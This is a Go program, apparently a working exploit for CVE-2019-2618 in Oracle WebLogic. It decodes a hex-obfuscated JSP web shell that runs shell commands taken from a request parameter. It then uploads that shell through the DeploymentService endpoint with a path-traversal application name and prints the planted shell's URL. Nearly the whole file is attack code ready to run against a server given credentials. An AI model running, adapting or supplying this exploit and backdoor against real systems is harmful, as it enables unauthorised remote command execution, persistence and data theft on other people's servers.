package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func file1() string {
	a := []byte("3c2540207061676520696d706f72743d226a6176612e7574696c2e2a2c6a6176612e696f2e2a22253e0d0a3c250d0a253e0d0a3c48544d4c3e3c424f44593e0d0a436f6d6d616e64732077697468204a53500d0a3c464f524d204d4554484f443d2247455422204e414d453d226d79666f726d2220414354494f4e3d22223e0d0a3c494e50555420545950453d227465787422204e414d453d22636d64223e0d0a3c494e50555420545950453d227375626d6974222056414c55453d2253656e64223e0d0a3c2f464f524d3e0d0a3c7072653e0d0a3c250d0a69662028726571756573742e676574506172616d657465722822636d64222920213d206e756c6c29207b0d0a202020206f75742e7072696e746c6e2822436f6d6d616e643a2022202b20726571756573742e676574506172616d657465722822636d642229202b20223c42523e22293b0d0a2020202050726f6365737320703b0d0a20202020696620282053797374656d2e67657450726f706572747928226f732e6e616d6522292e746f4c6f7765724361736528292e696e6465784f66282277696e646f7773222920213d202d31297b0d0a202020202020202070203d2052756e74696d652e67657452756e74696d6528292e657865632822636d642e657865202f432022202b20726571756573742e676574506172616d657465722822636d642229293b0d0a202020207d0d0a20202020656c73657b0d0a202020202020202070203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229293b0d0a202020207d0d0a202020204f757470757453747265616d206f73203d20702e6765744f757470757453747265616d28293b0d0a20202020496e70757453747265616d20696e203d20702e676574496e70757453747265616d28293b0d0a2020202044617461496e70757453747265616d20646973203d206e65772044617461496e70757453747265616d28696e293b0d0a20202020537472696e672064697372203d206469732e726561644c696e6528293b0d0a202020207768696c652028206469737220213d206e756c6c2029207b0d0a202020206f75742e7072696e746c6e2864697372293b0d0a2020202064697372203d206469732e726561644c696e6528293b0d0a202020207d0d0a7d0d0a253e0d0a3c2f7072653e0d0a3c2f424f44593e3c2f48544d4c3e")
	d := ""
	for i := 0; i < len(a); i += 2 {
		c, _ := hex.DecodeString(string(a[i : i+2]))
		d += string(c[0])
	}
	return d
}

func main() {
	fmt.Println("[*] cve-2019-2618 test starting")

	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url: ")
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}

	reader2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input username: ")
	username, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}

	reader3 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input password: ")
	password, _, err := reader3.ReadLine()
	if err != nil {
		panic(err)
	}
	file2 := file1()
	payload := fmt.Sprintf(`------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"shell.jsp\"; filename=\"%s\"\r\nContent-Type: false\r\n\r\n %s \r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--`, "shell.jsp", file2)
	var url2 string = string(url1) + "/bea_wls_deployment_internal/DeploymentService"

	var client http.Client

	req1, err := http.NewRequest("POST", url2, strings.NewReader(payload))
	if err != nil {
		panic(err)
	}
	req1.Header.Add("content-type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW")
	req1.Header.Add("username", string(username))
	req1.Header.Add("password", string(password))
	req1.Header.Add("wl_request_type", "app_upload")
	req1.Header.Add("wl_upload_application_name", "/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war")
	req1.Header.Add("wl_upload_delta", "true")
	req1.Header.Add("archive", "true")
	req1.Header.Add("serverName", "Jas502n")
	req1.Header.Add("server_version", "10.3.6.0")
	req1.Header.Add("cache-control", "no-cache")

	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	fmt.Println(rep1.Status)
	fmt.Println("shell address: ", string(url1)+"/bea_wls_internal/"+"shell.jsp")
}
